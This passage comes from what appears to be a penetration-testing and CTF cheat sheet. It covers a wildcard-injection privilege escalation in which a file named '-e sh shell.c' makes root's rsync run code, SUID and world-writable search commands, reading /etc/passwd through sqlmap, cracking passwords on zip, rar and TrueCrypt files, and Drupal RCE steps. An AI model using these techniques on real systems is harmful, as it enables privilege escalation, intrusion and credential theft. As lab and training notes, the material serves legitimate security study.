    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

  Now root will try to copy all C files to the remote server.

  :: 

    [root@defensecode public]# rsync -t *.c foo:src/

    rsync: connection unexpectedly closed (0 bytes received so far) [sender]
    rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]

  Let's see what happened...

  :: 

    [root@defensecode public]# ls -al
    total 76
    drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

  There were two files owned by user 'leon', as listed below.

  :: 

    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

  After 'rsync' execution, new file shell\_output.txt whose owner is root is created in same directory.

  :: 

    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

  If we check its content, following data is found.

  :: 

    [root@defensecode public]# cat shell_output.txt
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

  Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option on command line, and shell.c will be executed upon'rsync' start. Content of shell.c is presented below.

  :: 

    [root@defensecode public]# cat shell.c
    /usr/bin/id > shell_output.txt

Privilege esclation from g0tm1lk blog
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID

 ::

   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 
* Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm

 ::

   find / -writable -type d 2>/dev/null      # world-writeable folders
   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
   find / -perm -o w -type d 2>/dev/null     # world-writeable folders

   find / -perm -o x -type d 2>/dev/null     # world-executable folders

   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

* Any "problem" files? Word-writeable, "nobody" files

 ::

   find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
   find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files


Tips and Tricks
---------------

* run-parts 

 run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.

 :: 

  run-parts /etc/cron.daily

* Sudoers file: 

 If the sudoers file contains: 
	
 :: 

   secure\_path 
  Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment 	variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group option are not affected by secure\_path. This option is not set by default.

  env\_reset If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO\_\* variables. Any variables in the caller's environment that match the env\_keep and env\_check lists are then added, followed by any variables present in the file specified by the env\_file option (if any). The contents of the env\_keep and env\_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure\_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

  mail\_badpass Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail\_all\_cmnds, mail\_always, mail\_no\_host, mail\_no\_perms or mail\_no\_user flags are set, this flag will have no effect. This flag is off by default.

	
* XSS/ HTML Injection:

  The below will redirect the page to google.com

 ::
 
  <META http-equiv=“refresh” content=“0;URL=http://www.google.com”>

* It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be 	      	    important to see how a application is storing password.

* If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

* Identification of OS:
	
 :: 

  cat /etc/os-release

  NAME="Ubuntu" VERSION="16.04 LTS (Xenial Xerus)" ID=ubuntu
  ID\_LIKE=debian PRETTY\_NAME="Ubuntu 16.04 LTS" VERSION\_ID="16.04"
  HOME\_URL="http://www.ubuntu.com/"
  SUPPORT\_URL="http://help.ubuntu.com/"
  BUG\_REPORT\_URL="http://bugs.launchpad.net/ubuntu/"
  UBUNTU\_CODENAME=xenial


* Java keystore file: 
   <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores> and <https://www.digitalocean.com/    	community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>

* Cracking MD5 Hashes:  
   Try <https://crackstation.net/>


* Find files by wheel/ adm users.
  
 Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.

* When you see something like this "Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file

 :: 

   cat .htaccess 
   BrowserMatchNoCase "iPhone" allowed

   Order Deny,Allow 
   Deny from ALL 
   Allow from env=allowed 
   ErrorDocument 403 “<H1>Nick’s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>”

* Port 139 Open

 :: 

   smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Sharename       Type      Comment
   ---------       ----      -------
   print$          Disk      Printer Drivers
   kathy           Disk      Fred, What are we doing here?
   tmp             Disk      All temporary files should be stored here
   IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Server               Comment
   ---------            -------
   RED                  red server (Samba, Ubuntu)

   Workgroup            Master
   ---------            -------
   WORKGROUP            RED

   -N : If specified, this parameter suppresses the normal password promptfrom the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
   -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you aretrying to reach a host on another network.


 If you want to access the share you might want to type

 :: 

   smbclient \\\\IP\\share\_name

 So, in the above example, it would be

 ::

   smbclient \\\\192.168.1.2\\kathy

 If port 139 is open, also run enum4linux, may be it would help get the user list
    
    
* curl

  :: 

    -k, --insecure
    (SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
    This makes all connections considered "insecure" fail unless -k, --insecure is used.

    -I, --head
    (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.


* Port 69 UDP:

  TFTP

  :: 

   get or put file

	    
* Ruby Best way to get quoted words / phrases out of the text

  :: 

    text.scan(/"([^"]\*)"/)

    
* Convert all text in a file from UPPER to lowercase
	
  :: 

   tr '[:upper:]' '[:lower:]' < input.txt > output.txt


* Remove lines longer than x or shorter than x

  :: 

   awk 'length($0)>x' filename or awk 'length($0)

* In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in Breach 2)), we can upgrade it to meterpreter by using sessions -u

 :: 

   sessions -h
   Usage: sessions [options]
   
   Active session manipulation and interaction.

   OPTIONS:

   -u <opt>  Upgrade a shell to a meterpreter session on many platforms


* If you know the password of the user, however, ssh is not allowing you to login, check ssh\_config.

 ::

   ## Tighten security after security incident 
   ## root never gets to log in remotely PermitRootLogin no 
   ## Eugene & Margo can SSH in, no-one else allowed 
   AllowUsers eugene margo 
   ## SSH keys only but margo can use a password 
   Match user margo 
   PasswordAuthentication yes 	
   ## End tighten security
 
* Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.

* If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.

 :: 

   13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
   13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
   13:06:21.991250 Authentication (Open System)-1: Successful
   13:06:21.992274 Authentication (Open System)-1: Successful
   13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.992795 Authentication (Open System)-2: 
   13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
   13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
   13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
   13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
   13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
   13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
   13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
   13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station

* Transfer an image
	
 :: 

   base64 flair.jpg 
   Copy output 
   vi flair 
   Paste the clipboard 
   base64 -d flair > flair.jpg

* It's always important to find, what's installed on the box:

 :: 

   dpkg-query -l 

 or using wild cards

 :: 

   dpkg-query -l 'perl*'


* Password Protected File:
	  
 * ZIP File: run fcrackzip

  :: 

    fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

    -D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
    -p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
    -u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.

 * We can get the password hash of a password protected rar file by using rar2john

  :: 

    [root:~/Downloads]# rar2john crocs.rar
    file name: artwork.jpg
    crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg

* Data-URI:
	
  <https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics\_of\_HTTP/Data\_URIs>

* We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.

 :: 

    ssh -D localhost:9050 user@host

    -D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.

 and 
	
 :: 
	
   proxychains4 remmina


* If you have sql-shell from sqlmap, we can use

 :: 
	
   select load_file('/etc/passwd');

* If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.

 :: 

   truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>

 and Veracrypt to open the file.


* Getting a reverse shell from:

 * Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module.Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for. 
   
   Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down. Taken from <https://g0blin.co.uk/droopy-vulnhub-writeup/>
   Drupal settings file location: /var/www/html/sites/default/settings.php

* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.


